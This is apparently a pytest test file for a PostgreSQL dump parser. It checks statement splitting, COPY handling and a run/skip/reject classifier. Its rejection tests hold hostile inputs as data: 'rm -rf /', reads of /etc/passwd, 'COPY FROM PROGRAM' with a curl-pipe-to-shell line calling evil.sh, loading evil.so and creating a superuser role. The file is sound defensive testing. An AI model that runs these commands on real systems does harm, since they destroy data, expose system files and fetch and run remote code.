import pytest

from app.datasets.dump_parser import DumpRejected, classify, parse_dump, rewrite


def parse(text: str):
    return list(parse_dump(text.splitlines(keepends=True)))


class TestSplitting:
    def test_simple_statements(self):
        stmts = parse("CREATE TABLE a (id int);\nCREATE TABLE b (id int);\n")
        assert [s.sql for s in stmts] == ["CREATE TABLE a (id int);", "CREATE TABLE b (id int);"]

    def test_multiline_statement_keeps_start_line(self):
        stmts = parse("\n\nCREATE TABLE a (\n  id int\n);\n")
        assert len(stmts) == 1
        assert stmts[0].line == 3

    def test_semicolons_inside_strings_and_identifiers(self):
        stmts = parse("INSERT INTO t VALUES ('a;b', 'it''s; fine');\nCREATE TABLE \"we;ird\" (x int);\n")
        assert len(stmts) == 2

    def test_escape_string_with_backslash_quote(self):
        stmts = parse("SELECT E'it\\'s; ok';\nSELECT 2;\n")
        assert len(stmts) == 2

    def test_dollar_quoted_function_body(self):
        dump = (
            "CREATE FUNCTION f() RETURNS int LANGUAGE plpgsql AS $_$\n"
            "BEGIN\n"
            "  PERFORM 1; -- semicolons in here must not split\n"
            "  RETURN 2;\n"
            "END\n"
            "$_$;\n"
            "SELECT 1;\n"
        )
        stmts = parse(dump)
        assert len(stmts) == 2
        assert "RETURN 2;" in stmts[0].sql

    def test_positional_params_are_not_dollar_quotes(self):
        stmts = parse("CREATE FUNCTION f(int) RETURNS int AS 'select $1;' LANGUAGE sql;\nSELECT 1;\n")
        assert len(stmts) == 2

    def test_comments_ignored(self):
        stmts = parse("-- header; with semicolon\n/* block; comment */ SELECT 1;\n")
        assert len(stmts) == 1
        assert stmts[0].sql.endswith("SELECT 1;")

    def test_unterminated_statement_rejected(self):
        with pytest.raises(DumpRejected, match="middle of a statement"):
            parse("CREATE TABLE a (id int)\n")


class TestCopy:
    def test_copy_block_collected(self):
        dump = "COPY public.t (a, b) FROM stdin;\n1\tx\n\\N\ty\n\\.\nSELECT 1;\n"
        stmts = parse(dump)
        assert stmts[0].is_copy
        assert stmts[0].copy_data == ["1\tx\n", "\\N\ty\n"]  # \N (NULL) rows are data, not meta-commands
        assert stmts[1].sql == "SELECT 1;"

    def test_unterminated_copy_rejected(self):
        with pytest.raises(DumpRejected, match="not terminated"):
            parse("COPY t (a) FROM stdin;\n1\n")


class TestMetaCommands:
    @pytest.mark.parametrize("line", ["\\! rm -rf /", "\\connect other_db", "\\i /etc/passwd", "\\copy t to 'x'"])
    def test_rejected(self, line):
        with pytest.raises(DumpRejected, match="meta-command"):
            parse(f"SELECT 1;\n{line}\n")

    def test_pg_dump_restrict_lines_allowed(self):
        stmts = parse("\\restrict abc123\nSELECT 1;\n\\unrestrict abc123\n")
        assert len(stmts) == 1

    def test_backslash_inside_statement_is_not_meta(self):
        stmts = parse("CREATE FUNCTION f() RETURNS text AS $$\n\\! not a command here\n$$ LANGUAGE sql;\n")
        assert len(stmts) == 1


class TestClassify:
    @pytest.mark.parametrize("sql", [
        "CREATE TABLE public.film (id int);",
        "SELECT pg_catalog.set_config('search_path', '', false);",
        "SET client_encoding = 'UTF8';",
        "CREATE EXTENSION IF NOT EXISTS vector WITH SCHEMA public;",
        "COPY public.actor (actor_id) FROM stdin;",
        "CREATE VIEW v AS SELECT 1;",
    ])
    def test_run(self, sql):
        assert classify(sql)[0] == "run"

    @pytest.mark.parametrize("sql", [
        "ALTER TABLE public.film OWNER TO postgres;",
        "ALTER FUNCTION public.f(integer) OWNER TO someone;",
        "GRANT SELECT ON film TO PUBLIC;",
        "REVOKE ALL ON SCHEMA public FROM PUBLIC;",
        "SET statement_timeout = 0;",
        "SET ROLE postgres;",
        "COMMENT ON EXTENSION vector IS 'x';",
    ])
    def test_skip(self, sql):
        assert classify(sql)[0] == "skip"

    @pytest.mark.parametrize("sql", [
        "CREATE DATABASE other;",
        "DROP DATABASE ds_other;",
        "CREATE ROLE evil SUPERUSER;",
        "ALTER ROLE data_loader PASSWORD 'x';",
        "ALTER USER bot_reader SET default_transaction_read_only = off;",
        "ALTER SYSTEM SET log_statement = 'none';",
        "COPY t FROM PROGRAM 'curl evil.sh | sh';",
        "COPY t FROM '/etc/passwd';",
        "COPY t TO '/tmp/out';",
        "DO $$ BEGIN EXECUTE 'drop table x'; END $$;",
        "CREATE SUBSCRIPTION s CONNECTION 'host=x' PUBLICATION p;",
        "LOAD 'evil.so';",
        "CREATE LANGUAGE plpython3u;",
    ])
    def test_reject(self, sql):
        assert classify(sql)[0] == "reject"


def test_create_extension_made_idempotent():
    assert rewrite("CREATE EXTENSION vector;") == "CREATE EXTENSION IF NOT EXISTS vector;"
    assert rewrite("CREATE EXTENSION IF NOT EXISTS vector;") == "CREATE EXTENSION IF NOT EXISTS vector;"
